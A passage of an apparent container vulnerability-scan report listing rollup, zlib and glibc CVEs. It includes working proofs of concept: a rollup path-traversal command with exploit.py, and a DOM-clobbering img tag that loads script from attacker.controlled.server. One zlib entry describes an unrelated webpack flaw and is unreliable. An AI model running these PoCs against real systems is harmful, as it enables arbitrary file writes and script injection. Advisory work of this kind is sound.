2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the "sanitized" filename.
    ```typescript
    // src/rollup/rollup.ts (Line 317)
    const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName);
    ```
    Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write.

### PoC
A demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file.

**Scenario: CLI Named Input Exploit**
1.  Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`).
2.  Execute Rollup with a specifically crafted named input where the key contains traversal characters:
    ```bash
    rollup --input "a/../../pwned.js=main.js" --dir dist
    ```
3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder.

**Reproduction Files provided :**
*   `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug.
*   `exploit.py`: Automated script to run the PoC and verify the file escape.

vuln_app.js
```js
const path = require('path');
const fs = require('fs');

/**
 * REPLICATED ROLLUP VULNERABILITY
 * 
 * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts)
 * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)
 */

function sanitize(name) {
    // The vulnerability: Rollup's regex fails to strip dots and slashes, 
    // allowing path traversal sequences like '../'
    return name.replace(/[\u0000-\u001F"#$%&*+,:;<=>?[\]^`{|}\u007F]/g, '_');
}

async function build(userSuppliedName) {
    const outputDir = path.join(__dirname, 'dist');
    const fileName = sanitize(userSuppliedName);

    // Vulnerability: path.resolve() follows traversal sequences in the filename
    const outputPath = path.resolve(outputDir, fileName);

    console.log(`[*] Target write path: ${outputPath}`);

    if (!fs.existsSync(path.dirname(outputPath))) {
        fs.mkdirSync(path.dirname(outputPath), { recursive: true });
    }

    fs.writeFileSync(outputPath, 'console.log("System Compromised!");');
    console.log(`[+] File written successfully.`);
}

build(process.argv[2] || 'bundle.js');

```

exploit.py
```py
import subprocess
from pathlib import Path

def run_poc():
    # Target a file outside the 'dist' folder
    poc_dir = Path(__file__).parent
    malicious_filename = "../pwned_by_rollup.js"
    target_path = poc_dir / "pwned_by_rollup.js"

    print(f"=== Rollup Path Traversal PoC ===")
    print(f"[*] Malicious Filename: {malicious_filename}")
    
    # Trigger the vulnerable app
    subprocess.run(["node", "poc/vuln_app.js", malicious_filename])

    if target_path.exists():
        print(f"[SUCCESS] File escaped 'dist' folder!")
        print(f"[SUCCESS] Created: {target_path}")
        # target_path.unlink() # Cleanup
    else:
        print("[FAILED] Exploit did not work.")

if __name__ == "__main__":
    run_poc()
```

## POC 
```rollup --input "bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js" --dir dist```

<img width="1918" height="1111" alt="image" src="https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4" />



### Impact
This is a **High** level of severity vulnerability.
*   **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges.
*   **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase.
*   **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-47068?s=github&n=rollup&t=npm&vr=%3E%3D3.0.0%2C%3C3.29.5"><img alt="high 8.3: CVE--2024--47068" src="https://img.shields.io/badge/CVE--2024--47068-lightgrey?label=high%208.3&labelColor=e25d68"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code>>=3.0.0<br/><3.29.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.29.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.742%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

It's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.

### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

#### Gadget found in `rollup`

We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.

```
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
```

The output `bundle.js` is shown in the following code snippet.

```
'use strict';

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);
```

Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>rollup Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type="module" crossorigin src="bundle.js"></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.

### Patch

Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.

```
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
	getResolveUrl(
		`'${escapeId(relativePath)}', ${
			umd ? `typeof document === 'undefined' ? location.href : ` : ''
		}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`
	);
```

```
const getUrlFromDocument = (chunkId: string, umd = false) =>
	`${
		umd ? `typeof document === 'undefined' ? location.href : ` : ''
	}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(
		chunkId
	)}', document.baseURI).href)`;
```


</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>zlib</strong> <code>1:1.2.13.dfsg-1</code> (deb)</summary>

<small><code>pkg:deb/debian/zlib@1%3A1.2.13.dfsg-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-85091?s=debian&n=zlib&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--85091" src="https://img.shields.io/badge/CVE--2026--85091-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.469%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

zlib 1.2.11 through 1.3.2 contains a heap buffer overflow: after an underlying write() fails, gz_write() returns without resetting strm.next_in, leaving it pointed at the caller's buffer. A later gz* write call then derives a position from the stale pointer and writes past a heap allocation; any write() failure reaches it, including EPIPE on a blocking descriptor, and in versions before 1.3.1.2 the failed write must be followed by a gzclearerr() call.

---
- zlib 1:1.3.dfsg+really1.3.2-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1146895)
https://gist.github.com/thesmartshadow/e0b9481792afb7c31e86fee1ff084490
https://github.com/madler/zlib/issues/1310
https://github.com/madler/zlib/pull/1317
Fixed by: https://github.com/madler/zlib/commit/df84af25dc1942490e1d1c899a07619152a46148 (v1.4)
Discussion on affected range: https://github.com/madler/zlib/issues/1310#issuecomment-5979623265
Support non-blocking devices in the gz* routines introduced with:
https://github.com/madler/zlib/commit/81cc0bebedd935daeb81b0b6e475d8786b51af3d (v1.3.1.2)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-76844?s=debian&n=zlib&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--76844" src="https://img.shields.io/badge/CVE--2026--76844-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.682%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

webpack-dev-middleware 5.3.4, 6.1.2 through 6.1.3, 7.1.0 before 7.4.6, and 8.0.0 before 8.3.0 contains a path traversal vulnerability in getFilenameFromUrl that bypasses the fix for CVE-2024-29180: a publicPath without a trailing slash is matched by string prefix, and the '..' guard runs before that prefix is stripped. Unauthenticated attackers can request a path such as /assets../secret to read files one directory above the output directory when the middleware serves from the physical filesystem through writeToDisk or a custom outputFileSystem.

---
- zlib 1:1.3.dfsg+really1.3.2-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1153063)
Fixed by: https://github.com/madler/zlib/commit/df84af25dc1942490e1d1c899a07619152a46148 (v1.4)
Same fixing change as for CVE-2026-85091

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 10" src="https://img.shields.io/badge/L-10-fce1a9"/> <!-- unspecified: 0 --><strong>glibc</strong> <code>2.36-9+deb12u14</code> (deb)</summary>

<small><code>pkg:deb/debian/glibc@2.36-9%2Bdeb12u14?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-84243?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--84243" src="https://img.shields.io/badge/CVE--2026--84243-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.297%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The gettext family of functions in the GNU C Library version 2.0 and later accept LANGUAGE environment variable entries that contain '/' or that are equal to "..", unless the program is setuid or setgid (AT_SECURE).  An attacker who can set LANGUAGE in the environment of a program that uses gettext can make it load a message catalog (.mo file) from an arbitrary location in the file system.  A crafted .mo file can crash the program through out-of-range offsets, or supply translations whose format directives do not match the arguments passed by the program.  That causes undefined behaviour in the printf family of functions and may allow arbitrary code execution with the privileges of the program.  The safety of message catalogs relies on them being installed in trusted, read-only locations, and the directory traversal bypasses this.  The fix for CVE-2014-0475 rejects ".." path components in locale names passed to setlocale or taken from the LC_ALL, LC_* and LANG environment variables.  gettext reads LANGUAGE directly and appends each colon-separated entry to the message catalog directory, so that fix did not cover LANGUAGE.  LANGUAGE is only used when the LC_MESSAGES locale is not "C", "C.<encoding>" or "POSIX", so the attacker must also be able to select another installed locale, for example through LANG or LC_ALL.  Exploitation also requires that the attacker can place the crafted file in a location readable by the target program, and that the environment crosses a trust boundary without the program running as AT_SECURE.  An example is an SSH server that accepts LANGUAGE and LANG from clients through the AcceptEnv directive and restricts an account to a forced command; the attacker may use this to escape the restriction.

---
- glibc <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1152640)
[trixie] - glibc <no-dsa> (Minor issue)
https://sourceware.org/bugzilla/show_bug.cgi?id=17142
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2026-0025

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-86805?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2026--86805" src="https://img.shields.io/badge/CVE--2026--86805-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.097%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A time-of-check to time-of-use (TOCTOU) race condition in the dynamic loader (ld.so) of the GNU C Library (glibc) versions 2.14 through 2.44 allows a local attacker to escalate privileges. When expanding $ORIGIN in DT_RPATH for setuid/setgid (AT_SECURE) programs, glibc validates the lexically normalized search path against the trusted directories but then opens the raw, un-normalized path. On systems where the Linux fs.protected_hardlinks sysctl is disabled, a local attacker who hard-links such a program into an attacker-controlled directory and wins a race to replace an intermediate path component with a symbolic link can direct the loader outside the trusted directory, causing it to load an attacker-controlled shared object and execute arbitrary code with the elevated privileges of the program.  Exploitation requires an installed setuid or setgid binary whose DT_RPATH uses $ORIGIN followed by ".." traversal that normalizes into a trusted directory, and the ability to hard-link that binary and win the race by swapping a path component for a symbolic link. Major Linux-based OS distributions ship with fs.protected_hardlinks enabled by default and mitigate the vulnerability.

---
- glibc 2.43-7 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1148727)
[trixie] - glibc <no-dsa> (Minor issue)
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2026-0022
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=ed0c137b97eb940b4b64981e84ed806d3276edd9

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-115819?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2026--115819" src="https://img.shields.io/badge/CVE--2026--115819-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.263%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling the wide scanf family of functions (swscanf, fwscanf, wscanf, vswscanf, vfwscanf and vwscanf) with a %s or %[ conversion without the 'l' length modifier in the GNU C Library version 2.2 to version 2.44 writes an extra null byte one past the end of the destination array when the converted multibyte string and its terminating null byte exactly fill that array.  These conversions store each wide input character into the caller's char array as a multibyte sequence.  The conversion ends with the sequence that returns to the initial shift state, which also stores the terminating null byte, and the functions then append a second null byte.  A destination sized for the converted string and one terminator, as the C standard requires the caller to provide, is therefore written one byte past its end.  The out-of-bounds byte is always a null byte, which may corrupt adjacent data or crash the process.  An attacker who supplies the input can trigger the overflow with a string whose converted length exactly fills the destination.  The narrow scanf functions, the %ls and %l[ conversions into a wchar_t array, and the 'a' and 'm' allocation modifiers are not affected, and storing a wide scanf conversion into a narrow char array is uncommon.  This issue affects all architectures and ABIs supported by the GNU C Library.

---
- glibc <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1153886)
[trixie] - glibc <no-dsa> (Minor issue)
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2026-0027
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=d64b6ad07585b8a37e5fecc9a47fcee766d52ede

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97399?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--97399" src="https://img.shields.io/badge/CVE--2026--97399-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.281%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The strncasecmp function in the GNU C Library 2.24 and later optimized for the Power8 architecture may read one byte beyond the input size limit, which may crash a program when that byte is not readable.  This condition may happen when the input strings to the strncasecmp function are attacker controlled in an application and they match all the way up to the edge of their page and the neighbouring page is either not mapped or is not readable.

---
- glibc 2.43-7 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1149647)
[trixie] - glibc <no-dsa> (Minor issue)
https://sourceware.org/bugzilla/show_bug.cgi?id=34683
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2026-0024

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-100290?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--100290" src="https://img.shields.io/badge/CVE--2026--100290-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.336%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The regcomp and regexec functions in the GNU C Library version 2.3 to version 2.44 may read freed memory and free the same heap block twice when a memory allocation fails while a regular expression is compiled or matched.  The re_dfa_add_node (the NFA node table) and build_range_exp (bracket ranges) grow several arrays with consecutive realloc calls and store the new pointers only after all of them succeed.  When a later call fails, the pattern buffer keeps pointers to blocks that were already freed, and the error cleanup frees them again.  In regexec, the back-reference cache (match_ctx_add_entry) frees its array when a realloc fails but keeps the pointer, which is freed again on the error path.  An attacker does not need to supply a crafted regular expression: patterns large enough to grow these arrays are common.  The failure has to hit a specific allocation, though, so the issue can only be reached when the system is already under memory pressure.  An attacker who supplies the pattern or the subject string has little control over which allocation fails, so the expected impact is a crash of the process.  This issue affects all architectures and ABIs supported by the GNU C Library.

---
- glibc <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1153885)
[trixie] - glibc <no-dsa> (Minor issue)
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2026-0028
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=3b0bdc723579a7c6df2cace0115a6ca0977d73f9

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-95818?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--95818" src="https://img.shields.io/badge/CVE--2026--95818-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.102%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack-based buffer overflow in the dynamic loader (ld.so) of the GNU C Library (glibc) versions 2.14 through 2.44 allows a local attacker to crash or corrupt the memory of setuid/setgid (AT_SECURE) programs.  When such a program's DT_RPATH or DT_RUNPATH begins with $ORIGIN and is followed by NUL or '/' the loader both reads past the end of the path buffer and writes past the end of a stack-allocated internal buffer. The corrupted loader stack can lead to a loader crash (denial of service) and limited disclosure of process memory.

---
- glibc 2.43-7 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1148728)
[trixie] - glibc <no-dsa> (Minor issue)
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2026-0023
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=ed0c137b97eb940b4b64981e84ed806d3276edd9

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-9192?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--9192" src="https://img.shields.io/badge/CVE--2019--9192-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.447%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\1\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24269

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010025?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010025" src="https://img.shields.io/badge/CVE--2019--1010025-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.478%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is "ASLR bypass itself is not a vulnerability.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22853

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010024?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010024" src="https://img.shields.io/badge/CVE--2019--1010024-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.220%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22852

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010023?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010023" src="https://img.shields.io/badge/CVE--2019--1010023-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010022?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2019--1010022" src="https://img.shields.io/badge/CVE--2019--1010022-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.249%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22850

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20796?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2018--20796" src="https://img.shields.io/badge/CVE--2018--20796-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>5.804%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>93rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141
https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html
No treated as vulnerability: https://sourceware.org/glibc/wiki/Security%20Exceptions

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4756?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2010--4756" src="https://img.shields.io/badge/CVE--2010--4756-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.633%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.

---
- glibc <removed> (unimportant)
- eglibc <unfixed> (unimportant)
That's standard POSIX behaviour implemented by (e)glibc. Applications using
glob need to impose limits for themselves

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>perl</strong> <code>5.36.0-7+deb12u4</code> (deb)</summary>

<small><code>pkg:deb/debian/perl@5.36.0-7%2Bdeb12u4?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
